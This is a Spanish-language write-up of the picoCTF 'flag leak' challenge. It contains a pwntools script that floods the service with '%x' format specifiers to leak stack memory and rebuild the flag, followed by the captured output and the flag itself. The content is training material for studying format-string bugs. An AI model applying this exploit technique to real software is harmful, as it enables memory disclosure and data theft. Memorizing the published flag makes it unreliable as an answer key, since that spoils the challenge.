# flag leak

## Objetivo.
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using:`nc saturn.picoctf.net 52458`

## Solución.

**Con el siguiente script obtendremos la bandera** 

```
from pwn import *

s = remote("saturn.picoctf.net", 52458)

s.recv()
s.send(b"%x" * 200) # enough to fill the whole buffer
s.recvuntil(b"- \n")
leak = s.recv()
leak = leak.split(b"%x"[::-1].hex().encode("ascii"))[-1]

for i in range(0, len(leak), 8):
    flag = bytes.fromhex(leak[i:i+8].decode("ascii")).decode("ascii")[::-1]

    print(flag, end = "")

    if flag.endswith("}"):
        break

print()
```

**Salida**
```
[+] Opening connection to saturn.picoctf.net on port 55134: Done
picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}
[*] Closed connection to saturn.picoctf.net port 55134
```

**Bandera** picoCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}

## Notas opcionales.

## Referencias.